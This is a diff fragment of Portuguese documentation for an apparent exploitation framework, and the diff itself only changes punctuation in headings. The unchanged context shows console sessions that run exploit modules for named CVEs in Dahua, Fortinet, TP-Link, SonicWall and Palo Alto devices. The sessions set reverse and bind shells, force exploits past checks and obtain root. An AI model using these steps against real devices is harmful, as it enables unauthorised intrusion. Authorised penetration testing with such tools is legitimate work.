@@ -149,7 +149,7 @@ Upgrade shell:
 
 ---
 
-### Reverse shell (`nc_mkfifo`) — sem suporte a `-e`
+### Reverse shell (`nc_mkfifo`)  -  sem suporte a `-e`
 
 ```
 exf (dahua/cctv_rce_cve_2021_36260) > set lhost 10.10.14.22
@@ -170,7 +170,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 ---
 
-### Bind shell (`nc_bind`) — sem conectividade de saída
+### Bind shell (`nc_bind`)  -  sem conectividade de saída
 
 ```
 exf (fortinet/fortios_auth_bypass_cve_2022_40684) > set shell_type nc_bind
@@ -218,7 +218,7 @@ exf (fortinet/fortios_sslvpn_rce_cve_2024_21762) > run
 
 ---
 
-### Modo `auto` — tentativas sequenciais de shell
+### Modo `auto`  -  tentativas sequenciais de shell
 
 ```
 exf (tplink/wr841n_parental_control_rce_cve_2025_9377) > set shell_type auto
@@ -240,20 +240,20 @@ uid=0(root) gid=0(root)
 
 ---
 
-### `force_exploit` — ignorar `check()`
+### `force_exploit`  -  ignorar `check()`
 
 ```
 exf (sonicwall/sonicos_sslvpn_auth_bypass_cve_2024_53704) > set force_exploit true
 [+] force_exploit => true
 exf (sonicwall/sonicos_sslvpn_auth_bypass_cve_2024_53704) > run
 
-[*] force_exploit enabled — skipping check()
+[*] force_exploit enabled  -  skipping check()
 [*] Running module directly...
 ```
 
 ---
 
-### `ask_on_fail` — perguntar ao verificar resultado negativo
+### `ask_on_fail`  -  perguntar ao verificar resultado negativo
 
 ```
 exf (paloalto/panos_auth_bypass_cve_2025_0108) > check
